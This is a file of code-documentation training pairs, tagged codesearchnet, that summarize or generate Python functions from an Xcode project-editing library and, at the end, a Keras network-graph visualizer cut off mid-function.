{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef has_child(self, child):\n        if u'children' not in self:\n            return False\n\n        if not isinstance(child, basestring):\n            child = child.get_id()\n\n        return child in self.children", "response": "Checks if the given id is a child of the group."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef add_file(self, path, parent=None, tree=TreeType.SOURCE_ROOT, target_name=None, force=True, file_options=FileOptions()):\n        results = []\n        # if it's not forced to add the file stop if the file already exists.\n        if not force:\n            for section in self.objects.get_sections():\n                for obj in self.objects.get_objects_in_section(section):\n                    if u'path' in obj and ProjectFiles._path_leaf(path) == ProjectFiles._path_leaf(obj.path):\n                        return []\n\n        file_ref, abs_path, path, tree, expected_build_phase = self._add_file_reference(path, parent, tree, force,\n                                                                                        file_options)\n        if path is None or tree is None:\n            return None\n\n        # no need to create the build_files, done\n        if not file_options.create_build_files:\n            return results\n\n        # create build_files for the targets\n        results.extend(self._create_build_files(file_ref, target_name, expected_build_phase, file_options))\n\n        # special case for the frameworks and libraries to update the search paths\n        if tree != TreeType.SOURCE_ROOT or abs_path is None:\n            return results\n\n        # the path is absolute and it's outside the scope of the project for linking purposes\n        library_path = os.path.join(u'$(SRCROOT)', os.path.split(file_ref.path)[0])\n        if os.path.isfile(abs_path):\n            self.add_library_search_paths([library_path], recursive=False)\n        else:\n            self.add_framework_search_paths([library_path, u'$(inherited)'], recursive=False)\n\n        return results", "response": "Adds a file to the project and returns a list of PBXBuildFile objects that were created."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nadd an Xcode project into this project.", "response": "def add_project(self, path, parent=None, tree=TreeType.GROUP, target_name=None, force=True, file_options=FileOptions()):\n        \"\"\"\n        Adds another Xcode project into this project. Allows to use the products generated from the given project into\n        this project during compilation time. Optional: it can add the products into the different sections: frameworks\n        and bundles.\n\n        :param path: Path to the .xcodeproj file\n        :param parent: Parent group to be added under\n        :param tree: Tree where the path is relative to\n        :param target_name: Target name or list of target names where the file should be added (none for every target)\n        :param force: Add the file without checking if the file already exists\n        :param file_options: FileOptions object to be used during the addition of the file to the project.\n        :return: list of PBXReferenceProxy objects that can be used to create the PBXBuildFile phases.\n        \"\"\"\n        results = []\n        # if it's not forced to add the file stop if the file already exists.\n        if not force:\n            for section in self.objects.get_sections():\n                for obj in self.objects.get_objects_in_section(section):\n                    if u'path' in obj and ProjectFiles._path_leaf(path) == ProjectFiles._path_leaf(obj.path):\n                        return []\n\n        file_ref, _, path, tree, expected_build_phase = self._add_file_reference(path, parent, tree, force,\n                                                                                 file_options)\n        if path is None or tree is None:\n            return None\n\n        # load project and add the things\n        child_project = self.__class__.load(os.path.join(path, u'project.pbxproj'))\n        child_products = child_project.get_build_phases_by_name(u'PBXNativeTarget')\n\n        # create an special group without parent (ref proxies)\n        products_group = PBXGroup.create(name=u'Products', children=[])\n        self.objects[products_group.get_id()] = products_group\n\n        for child_product in child_products:\n            product_file_ref = child_project.objects[child_product.productReference]\n\n            # create the container proxies\n            container_proxy = PBXContainerItemProxy.create(file_ref, child_product)\n            self.objects[container_proxy.get_id()] = container_proxy\n\n            # create the reference proxies\n            reference_proxy = PBXReferenceProxy.create(product_file_ref, container_proxy)\n            self.objects[reference_proxy.get_id()] = reference_proxy\n\n            # add reference proxy to the product group\n            products_group.add_child(reference_proxy)\n\n            # append the result\n            results.append(reference_proxy)\n\n            if file_options.create_build_files:\n                _, expected_build_phase = self._determine_file_type(reference_proxy, file_options.ignore_unknown_type)\n                self._create_build_files(reference_proxy, target_name, expected_build_phase, file_options)\n\n        # add new PBXFileReference and PBXGroup to the PBXProject object\n        project_object = self.objects.get_objects_in_section(u'PBXProject')[0]\n        project_ref = PBXGenericObject(project_object).parse({\n            u'ProductGroup': products_group.get_id(),\n            u'ProjectRef': file_ref.get_id()\n        })\n\n        if u'projectReferences' not in project_object:\n            project_object[u'projectReferences'] = PBXList()\n\n        project_object.projectReferences.append(project_ref)\n\n        return results"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_file_by_id(self, file_id):\n        file_ref = self.objects[file_id]\n        if not isinstance(file_ref, PBXFileReference):\n            return None\n        return file_ref", "response": "Gets the PBXFileReference object for the given id."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_files_by_name(self, name, parent=None):\n        if parent is not None:\n            parent = self._get_parent_group(parent)\n\n        files = []\n        for file_ref in self.objects.get_objects_in_section(u'PBXFileReference'):\n            if file_ref.get_name() == name and (parent is None or parent.has_child(file_ref.get_id())):\n                files.append(file_ref)\n\n        return files", "response": "Returns all the files that have the given name under the given parent."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets the files under the given tree type that match the given path.", "response": "def get_files_by_path(self, path, tree=TreeType.SOURCE_ROOT):\n        \"\"\"\n        Gets the files under the given tree type that match the given path.\n        :param path: Path to the file relative to the tree root\n        :param tree: Tree type to look for the path. By default the SOURCE_ROOT\n        :return: List of all PBXFileReference that match the path and tree criteria.\n        \"\"\"\n        files = []\n        for file_ref in self.objects.get_objects_in_section(u'PBXFileReference'):\n            if file_ref.path == path and file_ref.sourceTree == tree:\n                files.append(file_ref)\n\n        return files"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nremoves the file from given target name.", "response": "def remove_file_by_id(self, file_id, target_name=None):\n        \"\"\"\n        Removes the file id from given target name. If no target name is given, the file is removed\n        from all targets\n        :param file_id: identifier of the file to be removed\n        :param target_name: Target name or list of target names where the file should be removed from (none for every\n            target)\n        :return: True if the file id was removed. False if the file was not removed.\n        \"\"\"\n\n        file_ref = self.get_file_by_id(file_id)\n        if file_ref is None:\n            return False\n\n        for target in self.objects.get_targets(target_name):\n            for build_phase_id in target.buildPhases:\n                build_phase = self.objects[build_phase_id]\n\n                for build_file_id in build_phase.files:\n                    build_file = self.objects[build_file_id]\n\n                    if build_file.fileRef == file_ref.get_id():\n                        # remove the build file from the phase\n                        build_phase.remove_build_file(build_file)\n\n                # if the build_phase is empty remove it too, unless it's a shell script.\n                if build_phase.files.__len__() == 0 and build_phase.isa != u'PBXShellScriptBuildPhase':\n                    # remove the build phase from the target\n                    target.remove_build_phase(build_phase)\n\n        # remove it iff it's removed from all targets or no build file reference it\n        for build_file in self.objects.get_objects_in_section(u'PBXBuildFile'):\n            if build_file.fileRef == file_ref.get_id():\n                return True\n\n        # remove the file from any groups if there is no reference from any target\n        for group in self.objects.get_objects_in_section(u'PBXGroup'):\n            if file_ref.get_id() in group.children:\n                group.remove_child(file_ref)\n\n        # the file is not referenced in any build file, remove it\n        del self.objects[file_ref.get_id()]\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef remove_files_by_path(self, path, tree=TreeType.SOURCE_ROOT, target_name=None):\n        files = self.get_files_by_path(path, tree)\n        result = 0\n        total = files.__len__()\n        for file_ref in files:\n            if self.remove_file_by_id(file_ref.get_id(), target_name=target_name):\n                result += 1\n\n        return result != 0 and result == total", "response": "Removes all files under the given path under the given tree."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef add_folder(self, path, parent=None, excludes=None, recursive=True, create_groups=True, target_name=None,\n                   file_options=FileOptions()):\n        \"\"\"\n        Given a directory, it will create the equivalent group structure and add all files in the process.\n        If groups matching the logical path already exist, it will use them instead of creating a new one. Same\n        apply for file within a group, if the file name already exists it will be ignored.\n\n        :param path: OS path to the directory to be added.\n        :param parent: Parent group to be added under\n        :param excludes: list of regexs to ignore\n        :param recursive: add folders recursively or stop in the first level\n        :param create_groups: add folders recursively as groups or references\n        :param target_name: Target name or list of target names where the file should be added (none for every target)\n        :param file_options: FileOptions object to be used during the addition of the file to the project.\n        :return: a list of elements that were added to the project successfully as PBXBuildFile objects\n        \"\"\"\n        if not os.path.isdir(path):\n            return None\n\n        if not excludes:\n            excludes = []\n\n        results = []\n\n        # add the top folder as a group, make it the new parent\n        path = os.path.abspath(path)\n        if not create_groups and os.path.splitext(path)[1] not in ProjectFiles._SPECIAL_FOLDERS:\n            return self.add_file(path, parent, target_name=target_name, force=False, file_options=file_options)\n\n        parent = self.get_or_create_group(os.path.split(path)[1], path, parent)\n\n        # iterate over the objects in the directory\n        for child in os.listdir(path):\n            # exclude dirs or files matching any of the expressions\n            if [pattern for pattern in excludes if re.match(pattern, child)]:\n                continue\n\n            full_path = os.path.join(path, child)\n            children = []\n            if os.path.isfile(full_path) or os.path.splitext(child)[1] in ProjectFiles._SPECIAL_FOLDERS or \\\n                    not create_groups:\n                # check if the file exists already, if not add it\n                children = self.add_file(full_path, parent, target_name=target_name, force=False,\n                                         file_options=file_options)\n            else:\n                # if recursive is true, go deeper, otherwise create the group here.\n                if recursive:\n                    children = self.add_folder(full_path, parent, excludes, recursive, target_name=target_name,\n                                               file_options=file_options)\n                else:\n                    self.get_or_create_group(child, child, parent)\n\n            results.extend(children)\n\n        return results", "response": "Adds a folder to the project."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns all the keys of the object", "response": "def get_keys(self):\n        \"\"\"\n        :return: all the keys of the object (ids of objects)\n        \"\"\"\n        keys = []\n        for section in self.get_sections():\n            phase = self._sections[section]\n            for obj in phase:\n                keys += obj.get_id()\n        keys.sort()\n        return keys"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nretrieving all target objects in the archive.", "response": "def get_targets(self, name=None):\n        \"\"\"\n        Retrieve all/one target objects\n        :param name: name of the target to search for, None for everything\n        :return: A list of target objects\n        \"\"\"\n        targets = []\n        for section in self.get_sections():\n            if section.endswith(u'Target'):\n                targets += [value for value in self._sections[section]]\n\n        if name is None:\n            return targets\n\n        if not isinstance(name, list):\n            name = [name]\n\n        return [target for target in targets if target.name in name]"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns all configurations that are given a specific target and a specific configuration.", "response": "def get_configurations_on_targets(self, target_name=None, configuration_name=None):\n        \"\"\"\n        Retrieves all configuration given a name on the specified target\n        :param target_name: Searches for a specific target name or a list of target names. If None all targets are used\n        :param configuration_name: Searches for a specific configuration, if None all configuration of the target\n            are used\n        :return: A generator of configurations objects matching the target and configuration given (or all if nothing is\n            specified)\n        \"\"\"\n        for target in self.get_targets(target_name):\n            configuration_list = self[target.buildConfigurationList]\n            for configuration in configuration_list.buildConfigurations:\n                if configuration_name is None or self[configuration].name == configuration_name:\n                    yield self[configuration]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nadding the given flags to the flag_name section of the target on the configurations .", "response": "def add_flags(self, flag_name, flags, target_name=None, configuration_name=None):\n        \"\"\"\n        Adds the given flags to the flag_name section of the target on the configurations\n        :param flag_name: name of the flag to be added the values to\n        :param flags: A string or array of strings\n        :param target_name: Target name or list of target names to add the flag to or None for every target\n        :param configuration_name: Configuration name to add the flag to or None for every configuration\n        :return: void\n        \"\"\"\n        for configuration in self.objects.get_configurations_on_targets(target_name, configuration_name):\n            configuration.add_flags(flag_name, flags)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nadd flags values to the OTHER_CFLAGS flag.", "response": "def add_other_cflags(self, flags, target_name=None, configuration_name=None):\n        \"\"\"\n        Adds flag values to the OTHER_CFLAGS flag.\n        :param flags: A string or array of strings. If none, removes all values from the flag.\n        :param target_name: Target name or list of target names to add the flag to or None for every target\n        :param configuration_name: Configuration name to add the flag to or None for every configuration\n        :return: void\n        \"\"\"\n        self.add_flags(XCBuildConfigurationFlags.OTHER_CFLAGS, flags, target_name, configuration_name)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef remove_other_cflags(self, flags, target_name=None, configuration_name=None):\n        self.remove_flags(XCBuildConfigurationFlags.OTHER_CFLAGS, flags, target_name, configuration_name)", "response": "Removes the given flags from the OTHER_CFLAGS section of the target on the configurations\n       ."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nadds the given flags to the OTHER_LDFLAGS flag.", "response": "def add_other_ldflags(self, flags, target_name=None, configuration_name=None):\n        \"\"\"\n        Adds flag values to the OTHER_LDFLAGS flag.\n        :param flags: A string or array of strings. If none, removes all values from the flag.\n        :param target_name: Target name or list of target names to add the flag to or None for every target\n        :param configuration_name: Configuration name to add the flag to or None for every configuration\n        :return: void\n        \"\"\"\n        self.add_flags(XCBuildConfigurationFlags.OTHER_LDFLAGS, flags, target_name, configuration_name)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef remove_other_ldflags(self, flags, target_name=None, configuration_name=None):\n        self.remove_flags(XCBuildConfigurationFlags.OTHER_LDFLAGS, flags, target_name, configuration_name)", "response": "Removes the given flags from the OTHER_LDFLAGS section of the target on the configurations\n       ."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef add_search_paths(self, path_type, paths, recursive=True, escape=False, target_name=None,\n                         configuration_name=None):\n        \"\"\"\n        Adds the given search paths to the path type section of the target on the configurations\n        :param path_type: name of the flag to be added the values to\n        :param paths: A string or array of strings\n        :param recursive: Add the paths as recursive ones\n        :param escape: Escape the path in case it contains spaces\n        :param target_name: Target name or list of target names to add the flag to or None for every target\n        :param configuration_name: Configuration name to add the flag to or None for every configuration\n        :return: void\n        \"\"\"\n        for configuration in self.objects.get_configurations_on_targets(target_name, configuration_name):\n            configuration.add_search_paths(path_type, paths, recursive, escape)", "response": "Adds the given search paths to the path type section of the target and configuration."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nremove the given search paths from the path_type section of the target and configuration.", "response": "def remove_search_paths(self, path_type, paths, target_name=None, configuration_name=None):\n        \"\"\"\n        Removes the given search paths from the path_type section of the target on the configurations\n        :param path_type: name of the path type to be removed the values from\n        :param paths: A string or array of strings\n        :param target_name: Target name or list of target names to remove the flag from or None for every target\n        :param configuration_name: Configuration name to add the flag to or None for every configuration\n        :return: void\n        \"\"\"\n        for configuration in self.objects.get_configurations_on_targets(target_name, configuration_name):\n            configuration.remove_search_paths(path_type, paths)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nadding the paths to the HEADER_SEARCH_PATHS configuration.", "response": "def add_header_search_paths(self, paths, recursive=True, escape=False, target_name=None, configuration_name=None):\n        \"\"\"\n        Adds paths to the HEADER_SEARCH_PATHS configuration.\n        :param paths: A string or array of strings\n        :param recursive: Add the paths as recursive ones\n        :param escape: Escape the path in case it contains spaces\n        :param target_name: Target name or list of target names to add the flag to or None for every target\n        :param configuration_name: Configuration name to add the flag to or None for every configuration\n        :return: void\n        \"\"\"\n        self.add_search_paths(XCBuildConfigurationFlags.HEADER_SEARCH_PATHS, paths, recursive, escape, target_name,\n                              configuration_name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef remove_header_search_paths(self, paths, target_name=None, configuration_name=None):\n        self.remove_search_paths(XCBuildConfigurationFlags.HEADER_SEARCH_PATHS, paths, target_name, configuration_name)", "response": "Removes the given search paths from the HEADER_SEARCH_PATHS section of the target on the configurations\n       ."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef add_library_search_paths(self, paths, recursive=True, escape=False, target_name=None, configuration_name=None):\n        self.add_search_paths(XCBuildConfigurationFlags.LIBRARY_SEARCH_PATHS, paths, recursive, escape, target_name,\n                              configuration_name)", "response": "Adds the search paths to the LIBRARY_SEARCH_PATHS configuration."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nremove the given search paths from the LIBRARY_SEARCH_PATHS section of the target on the configurations .", "response": "def remove_library_search_paths(self, paths, target_name=None, configuration_name=None):\n        \"\"\"\n        Removes the given search paths from the LIBRARY_SEARCH_PATHS section of the target on the configurations\n        :param paths: A string or array of strings\n        :param target_name: Target name or list of target names to remove the flag from or None for every target\n        :param configuration_name: Configuration name to add the flag to or None for every configuration\n        :return: void\n        \"\"\"\n        self.remove_search_paths(XCBuildConfigurationFlags.LIBRARY_SEARCH_PATHS, paths, target_name, configuration_name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef add_framework_search_paths(self, paths, recursive=True, escape=False, target_name=None,\n                                   configuration_name=None):\n        \"\"\"\n        Adds paths to the FRAMEWORK_SEARCH_PATHS configuration.\n        :param paths: A string or array of strings\n        :param recursive: Add the paths as recursive ones\n        :param escape: Escape the path in case it contains spaces\n        :param target_name: Target name or list of target names to add the flag to or None for every target\n        :param configuration_name: Configuration name to add the flag to or None for every configuration\n        :return: void\n        \"\"\"\n        self.add_search_paths(XCBuildConfigurationFlags.FRAMEWORK_SEARCH_PATHS, paths, recursive, escape, target_name,\n                              configuration_name)", "response": "Adds the framework search paths to the FRAMEWORK_SEARCH_PATHS configuration."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nremoves the given search paths from the FRAMEWORK_SEARCH_PATHS section of the target on the configurations .", "response": "def remove_framework_search_paths(self, paths, target_name=None, configuration_name=None):\n        \"\"\"\n        Removes the given search paths from the FRAMEWORK_SEARCH_PATHS section of the target on the configurations\n        :param paths: A string or array of strings\n        :param target_name: Target name or list of target names to remove the flag from or None for every target\n        :param configuration_name: Configuration name to add the flag to or None for every configuration\n        :return: void\n        \"\"\"\n        self.remove_search_paths(XCBuildConfigurationFlags.FRAMEWORK_SEARCH_PATHS, paths, target_name, configuration_name)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef add_run_script(self, script, target_name=None, insert_before_compile=False):\n        for target in self.objects.get_targets(target_name):\n            shell = PBXShellScriptBuildPhase.create(script)\n\n            self.objects[shell.get_id()] = shell\n            target.add_build_phase(shell, 0 if insert_before_compile else None)", "response": "Adds a run script phase into the given target."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef remove_run_script(self, script, target_name=None):\n        for target in self.objects.get_targets(target_name):\n            for build_phase_id in target.buildPhases:\n                build_phase = self.objects[build_phase_id]\n                if not isinstance(build_phase, PBXShellScriptBuildPhase):\n                    continue\n\n                if build_phase.shellScript == script:\n                    del self.objects[build_phase_id]\n                    target.remove_build_phase(build_phase)", "response": "Removes the given script string from the given target_name."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nadding the code sign information to the project and creates the appropriate flags in the configuration.", "response": "def add_code_sign(self, code_sign_identity, development_team, provisioning_profile_uuid,\n                      provisioning_profile_specifier, target_name=None, configuration_name=None):\n        \"\"\"\n        Adds the code sign information to the project and creates the appropriate flags in the configuration.\n        In xcode 8+ the provisioning_profile_uuid becomes optional, and the provisioning_profile_specifier becomes\n        mandatory. Contrariwise, in xcode 8< provisioning_profile_uuid becomes mandatory and\n        provisioning_profile_specifier becomes optional.\n\n        :param code_sign_identity: Code sign identity name. Usually formatted as: 'iPhone Distribution[: <Company name> (MAAYFEXXXX)]'\n        :param development_team: Development team identifier string. Usually formatted as: 'MAAYFEXXXX'\n        :param provisioning_profile_uuid: Provisioning profile UUID string. Usually formatted as: '6f1ffc4d-xxxx-xxxx-xxxx-6dc186280e1e'\n        :param provisioning_profile_specifier: Provisioning profile specifier (a.k.a. name) string.\n        :param target_name: Target name or list of target names to add the flag to or None for every target\n        :param configuration_name: Configuration name to add the flag to or None for every configuration\n        :return:\n        \"\"\"\n        self.set_flags(u'CODE_SIGN_IDENTITY[sdk=iphoneos*]', code_sign_identity, target_name, configuration_name)\n        self.set_flags(u'DEVELOPMENT_TEAM', development_team, target_name, configuration_name)\n        self.set_flags(u'PROVISIONING_PROFILE', provisioning_profile_uuid, target_name, configuration_name)\n        self.set_flags(u'PROVISIONING_PROFILE_SPECIFIER', provisioning_profile_specifier, target_name, configuration_name)\n\n        for target in self.objects.get_targets(target_name):\n            self.objects[self.rootObject].set_provisioning_style(PBXProvioningTypes.MANUAL, target)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nadding a new group with the given name and optionally path to the parent group.", "response": "def add_group(self, name, path=None, parent=None, source_tree=u'<group>'):\n        \"\"\"\n        Add a new group with the given name and optionally path to the parent group. If parent is None, the group will\n        be added to the 'root' group.\n        Additionally the source tree type can be specified, normally it's group.\n        :param name: Name of the group to be added (visible folder name)\n        :param path: Path relative to the project where this group points to. If not present, name will match the path\n            name\n        :param parent: The PBXGroup that will be the parent of this group. If parent is None, the default 'root' group\n            will be used as parent\n        :param source_tree: The type of group to be created\n        :return: PBXGroup created\n        \"\"\"\n        group = PBXGroup.create(name=name, path=path, tree=source_tree)\n\n        parent = self._get_parent_group(parent)\n\n        parent.add_child(group)\n        self.objects[group.get_id()] = group\n\n        return group"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nremoving the group matching the given group_id.", "response": "def remove_group_by_id(self, group_id, recursive=True):\n        \"\"\"\n        Remove the group matching the given group_id. If recursive is True, all descendants of this group are also removed.\n        :param group_id: The group id to be removed\n        :param recursive: All descendants should be removed as well\n        :return: True if the element was removed successfully, False if an error occured or there was nothing to remove.\n        \"\"\"\n        group = self.objects[group_id]\n        if group is None:\n            return False\n\n        result = True\n        # iterate over the children and determine if they are file/group and call the right method.\n        for subgroup_id in list(group.children):\n            subgroup = self.objects[subgroup_id]\n            if subgroup is None:\n                return False\n\n            if recursive and isinstance(subgroup, PBXGroup):\n                result &= self.remove_group_by_id(subgroup.get_id(), recursive)\n            if isinstance(subgroup, PBXFileReference):\n                result &= self.remove_file_by_id(subgroup.get_id())\n\n        if not result:\n            return False\n\n        del self.objects[group.get_id()]\n\n        # remove the reference from any other group object that could be containing it.\n        for other_group in self.objects.get_objects_in_section(u'PBXGroup'):\n            other_group.remove_child(group)\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nremoving the group with the given name.", "response": "def remove_group_by_name(self, group_name, recursive=True):\n        \"\"\"\n        Remove the groups matching the given name. If recursive is True, all descendants of this group are also removed.\n        This method could cause the removal of multiple groups that not necessarily are intended to be removed, use with\n        caution\n        :param group_name: The group name to be removed\n        :param recursive: All descendants should be removed as well\n        :return: True if the element was removed successfully, False otherwise\n        \"\"\"\n        groups = self.get_groups_by_name(name=group_name)\n\n        if groups.__len__() == 0:\n            return False\n\n        for group in groups:\n            if not self.remove_group_by_id(group.get_id(), recursive):\n                return False\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nretrieves all PBXGroups with the given name and optionally filtered by the given parent node.", "response": "def get_groups_by_name(self, name, parent=None):\n        \"\"\"\n        Retrieve all groups matching the given name and optionally filtered by the given parent node.\n        :param name: The name of the group that has to be returned\n        :param parent: A PBXGroup object where the object has to be retrieved from. If None all matching groups are returned\n        :return: An list of all matching groups\n        \"\"\"\n        groups = self.objects.get_objects_in_section(u'PBXGroup')\n        groups = [group for group in groups if group.get_name() == name]\n\n        if parent:\n            return [group for group in groups if parent.has_child(group)]\n\n        return groups"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_groups_by_path(self, path, parent=None):\n        groups = self.objects.get_objects_in_section(u'PBXGroup')\n        groups = [group for group in groups if group.get_path() == path]\n\n        if parent:\n            return [group for group in groups if parent.has_child(group)]\n\n        return groups", "response": "Retrieves all PBXGroups that match the given path and optionally filtered by the given parent node."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef ann_viz(model, view=True, filename=\"network.gv\", title=\"My Neural Network\"):\n    from graphviz import Digraph;\n    import keras;\n    from keras.models import Sequential;\n    from keras.layers import Dense, Conv2D, MaxPooling2D, Dropout, Flatten;\n    import json;\n    input_layer = 0;\n    hidden_layers_nr = 0;\n    layer_types = [];\n    hidden_layers = [];\n    output_layer = 0;\n    for layer in model.layers:\n        if(layer == model.layers[0]):\n            input_layer = int(str(layer.input_shape).split(\",\")[1][1:-1]);\n            hidden_layers_nr += 1;\n            if (type(layer) == keras.layers.core.Dense):\n                hidden_layers.append(int(str(layer.output_shape).split(\",\")[1][1:-1]));\n                layer_types.append(\"Dense\");\n            else:\n                hidden_layers.append(1);\n                if (type(layer) == keras.layers.convolutional.Conv2D):\n                    layer_types.append(\"Conv2D\");\n                elif (type(layer) == keras.layers.pooling.MaxPooling2D):\n                    layer_types.append(\"MaxPooling2D\");\n                elif (type(layer) == keras.layers.core.Dropout):\n                    layer_types.append(\"Dropout\");\n                elif (type(layer) == keras.layers.core.Flatten):\n                    layer_types.append(\"Flatten\");\n                elif (type(layer) == keras.layers.core.Activation):\n                    layer_types.append(\"Activation\");\n        else:\n            if(layer == model.layers[-1]):\n                output_layer = int(str(layer.output_shape).split(\",\")[1][1:-1]);\n            else:\n                hidden_layers_nr += 1;\n                if (type(layer) == keras.layers.core.Dense):\n                    hidden_layers.append(int(str(layer.output_shape).split(\",\")[1][1:-1]));\n                    layer_types.append(\"Dense\");\n                else:\n                    hidden_layers.append(1);\n                    if (type(layer) == keras.layers.convolutional.Conv2D):\n                        layer_types.append(\"Conv2D\");\n                    elif (type(layer) == keras.layers.pooling.MaxPooling2D):\n                        layer_types.append(\"MaxPooling2D\");\n                    elif (type(layer) == keras.layers.core.Dropout):\n                        layer_types.append(\"Dropout\");\n                    elif (type(layer) == keras.layers.core.Flatten):\n                        layer_types.append(\"Flatten\");\n                    elif (type(layer) == keras.layers.core.Activation):\n                        layer_types.append(\"Activation\");\n        last_layer_nodes = input_layer;\n        nodes_up = input_layer;\n        if(type(model.layers[0]) != keras.layers.core.Dense):\n            last_layer_nodes = 1;\n            nodes_up = 1;\n            input_layer = 1;\n\n        g = Digraph('g', filename=filename);\n        n = 0;\n        g.graph_attr.update(splines=\"false\", nodesep='1', ranksep='2');\n        #Input Layer\n        with g.subgraph(name='cluster_input') as c:\n            if(type(model.layers[0]) == keras.layers.core.Dense):\n                the_label = title+'\\n\\n\\n\\nInput Layer';\n                if (int(str(model.layers[0].input_shape).split(\",\")[1][1:-1]) > 10):\n                    the_label += \" (+\"+str(int(str(model.layers[0].input_shape).split(\",\")[1][1:-1]) - 10)+\")\";\n                    input_layer = 10;\n                c.attr(color='white')\n                for i in range(0, input_layer):\n                    n += 1;\n                    c.node(str(n));\n                    c.attr(label=the_label)\n                    c.attr(rank='same');\n                    c.node_attr.update(color=\"#2ecc71\", style=\"filled\", fontcolor=\"#2ecc71\", shape=\"circle\");\n\n            elif(type(model.layers[0]) == keras.layers.convolutional.Conv2D):\n                #Conv2D Input visualizing\n                the_label = title+'\\n\\n\\n\\nInput Layer';\n                c.attr(color=\"white\", label=the_label);\n                c.node_attr.update(shape=\"square\");\n                pxls = str(model.layers[0].input_shape).split(',');\n                clr = int(pxls[3][1:-1]);\n                if (clr == 1):\n                    clrmap = \"Grayscale\";\n                    the_color = \"black:white\";\n                elif (clr == 3):\n                    clrmap = \"RGB\";\n                    the_color = \"#e74c3c:#3498db\";\n                else:\n                    clrmap = \"\";\n                c.node_attr.update(fontcolor=\"white\", fillcolor=the_color, style=\"filled\");\n                n += 1;\n                c.node(str(n), label=\"Image\\n\"+pxls[1]+\" x\"+pxls[2]+\" pixels\\n\"+clrmap, fontcolor=\"white\");\n            else:\n                raise ValueError(\"ANN Visualizer: Layer not supported for visualizing\");\n        for i in range(0, hidden_layers_nr):\n            with g.subgraph(name=\"cluster_\"+str(i+1)) as c:\n                if (layer_types[i] == \"Dense\"):\n                    c.attr(color='white');\n                    c.attr(rank='same');\n                    #If hidden_layers[i] > 10, dont include all\n                    the_label = \"\";\n                    if (int(str(model.layers[i].output_shape).split(\",\")[1][1:-1]) > 10):\n                        the_label += \" (+\"+str(int(str(model.layers[i].output_shape).split(\",\")[1][1:-1]) - 10)+\")\";\n                        hidden_layers[i] = 10;\n                    c.attr(labeljust=\"right\", labelloc=\"b\", label=the_label);\n                    for j in range(0, hidden_layers[i]):\n                        n += 1;\n                        c.node(str(n), shape=\"circle\", style=\"filled\", color=\"#3498db\", fontcolor=\"#3498db\");\n                        for h in range(nodes_up - last_layer_nodes + 1 , nodes_up + 1):\n                            g.edge(str(h), str(n));\n                    last_layer_nodes = hidden_layers[i];\n                    nodes_up += hidden_layers[i];\n                elif (layer_types[i] == \"Conv2D\"):\n                    c.attr(style='filled', color='#5faad0');\n                    n += 1;\n                    kernel_size = str(model.layers[i].get_config()['kernel_size']).split(',')[0][1] + \"x\" + str(model.layers[i].get_config()['kernel_size']).split(',')[1][1 : -1];\n                    filters = str(model.layers[i].get_config()['filters']);\n                    c.node(\"conv_\"+str(n), label=\"Convolutional Layer\\nKernel Size: \"+kernel_size+\"\\nFilters: \"+filters, shape=\"square\");\n                    c.node(str(n), label=filters+\"\\nFeature Maps\", shape=\"square\");\n                    g.edge(\"conv_\"+str(n), str(n));\n                    for h in range(nodes_up - last_layer_nodes + 1 , nodes_up + 1):\n                        g.edge(str(h), \"conv_\"+str(n));\n                    last_layer_nodes = 1;\n                    nodes_up += 1;\n                elif (layer_types[i] == \"MaxPooling2D\"):\n                    c.attr(color=\"white\");\n                    n += 1;\n                    pool_size = str(model.layers[i].get_config()['pool_size']).split(',')[0][1] + \"x\" + str(model.layers[i].get_config()['pool_size']).split(',')[1][1 : -1];\n                    c.node(str(n), label=\"Max Pooling\\nPool Size: \"+pool_size, style=\"filled\", fillcolor=\"#8e44ad\", fontcolor=\"white\");\n                    for h in range(nodes_up - last_layer_nodes + 1 , nodes_up + 1):\n                        g.edge(str(h), str(n));\n                    last_layer_nodes = 1;\n                    nodes_up += 1;\n                elif (layer_types[i] == \"Flatten\"):\n                    n += 1;\n                    c.attr(color=\"white\");\n                    c.node(str(n), label=\"Flattening\", shape=\"invtriangle\", 